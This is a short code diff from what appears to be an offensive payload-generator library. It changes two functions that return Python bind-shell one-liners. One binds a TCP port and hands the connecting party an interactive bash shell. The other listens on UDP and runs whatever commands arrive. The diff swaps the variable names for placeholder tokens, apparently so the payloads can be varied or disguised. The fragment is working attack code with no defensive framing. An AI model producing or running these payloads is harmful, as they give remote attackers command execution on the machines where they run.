@@ -3,11 +3,11 @@
 # Bind TCP shells
 
 def BIND_PYTHON_TCP():
-    return """python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',PORT));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])" """
+    return """python -c "import socket,subprocess,os;VAR1=socket.socket(socket.AF_INET,socket.SOCK_STREAM);VAR1.bind(('',PORT));VAR1.listen(1);conn,addr=VAR1.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);VAR2=subprocess.call(['/bin/bash','-i'])" """
 
 
 def BIND_PYTHON_UDP():
-    return """python -c 'while 1: from subprocess import Popen,PIPE;from socket import socket, AF_INET, SOCK_DGRAM;s=socket(AF_INET,SOCK_DGRAM);s.bind(("0.0.0.0",PORT));data,addr=s.recvfrom(8096);out=Popen(data,shell=True,stdout=PIPE,stderr=PIPE).communicate();s.sendto("".join([out[0],out[1]]),addr)'"""
+    return """python -c 'while NUM1: from subprocess import Popen,PIPE;from socket import socket,AF_INET,SOCK_DGRAM;VAR1=socket(AF_INET,SOCK_DGRAM);VAR1.bind(("0.0.0.0",PORT));VAR2,VAR3=VAR1.recvfrom(8096);VAR4=Popen(VAR2,shell=True,stdout=PIPE,stderr=PIPE).communicate();VAR1.sendto("".join([VAR4[0],VAR4[1]]),VAR3)'"""
 
 
 def BIND_PERL_TCP():
